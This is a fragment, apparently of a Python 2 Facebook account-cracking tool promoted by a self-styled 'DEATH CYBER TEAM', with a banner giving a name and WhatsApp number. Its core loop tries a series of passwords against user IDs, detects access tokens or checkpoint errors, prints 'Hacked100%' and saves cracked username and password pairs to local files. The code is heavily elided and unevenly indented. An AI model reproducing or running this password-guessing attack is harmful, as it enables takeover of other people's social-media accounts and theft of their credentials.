...
"""
logo2 = """
\x1b[1;92m➣ NAME :           💗 IMTIAZ ZEHEN 💗
\x1b[1;91m➣ PGE NAME :  💣DEATH CYBER TEAM💣
\x1b[1;93m➣ WHATSAPP NO :   👬 +8801940059100 👬
...
def action():
	...
	if ahmad =='':
		...
		os.system('xdg-open https://www.facebook.com/Remember.This.Name.ARIY4N)
		login()
	elif ahmad =='0':
		exb()
	else:
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\x1b[1;92m{ZEHEN- Hacked100%💉}  ' + k + c + user + '  》  ' + pass1+'\n'+"\n"
				...
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;96m[ZEHEN- Checkpoint] ' + k + c + user + '  》  ' + pass1+'\n'
					...
					cpb.append(c+user+pass1)
 				    ...
 				    q = json.load(data)
 				    if 'access_token' in q:
 				        print '\x1b[1;92m{ZEHEN- Hacked100%💉}  ' + k + c + user + '  》  ' + pass2+'\n'+"\n"
 				        okb = open('save/successfull.txt', 'a')
 				        ...
 				        if 'www.facebook.com' in q['error_msg']:
 					        print '\033[1;96m[ZEHEN- Checkpoint] ' + k + c + user + '  》  ' + pass2+'\n'
 					        cps = open('save/checkpoint.txt', 'a')
 				            ...
 				            q = json.load(data)
 				            if 'access_token' in q:
 				                print '\x1b[1;92m{ZEHEN- Hacked100%💉}  ' + k + c + user + '  》  ' + pass3+'\n'+"\n"
 				                okb = open('save/successfull.txt', 'a')
 				                ...
 				                if 'www.facebook.com' in q['error_msg']:
 					                print '\033[1;96m[ZEHEN- Checkpoint] ' + k + c + user + '  》  ' + pass3+'\n'
 					                cps = open('save/checkpoint.txt', 'a')
 				                    ...
 				                    q = json.load(data)
 				                    if 'access_token' in q:
 				                        print '\x1b[1;92m{ZEHEN- Hacked100%💉}  ' + k + c + user + '  》  ' + pass4+'\n'+"\n"
 				                        okb = open('save/successfull.txt', 'a')
 				                        ...
 				                        if 'www.facebook.com' in q['error_msg']:
 					                        print '\033[1;96m[ZEHEN- Checkpoint] ' + k + c + user + '  》  ' + pass4+'\n'
 					                        cps = open('save/checkpoint.txt', 'a')
